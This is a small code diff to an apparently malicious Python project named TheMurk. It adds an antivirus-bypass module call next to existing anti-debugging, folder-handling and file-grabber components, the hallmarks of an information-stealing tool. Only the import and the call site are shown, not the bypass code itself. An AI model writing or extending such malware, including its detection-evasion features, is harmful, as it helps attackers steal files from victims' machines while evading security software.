@@ -1,5 +1,6 @@
 from preferences.config import config
 from manager.antiDebug import AntiDebug
+from manager.avbypass import AvByPass
 from manager.folders import Folders
 from targets.files.files import TxtFiles
 from targets.files.file_grabber import Grab
@@ -44,6 +45,8 @@ class TheMurk:
     def Start(self):
         if not config.debuging:
             AntiDebug(config.oneStart)
+        if config.avbypass:
+            AvByPass()
         Folders(config.enableFileGrabber)
     
     def GrabFiles(self):
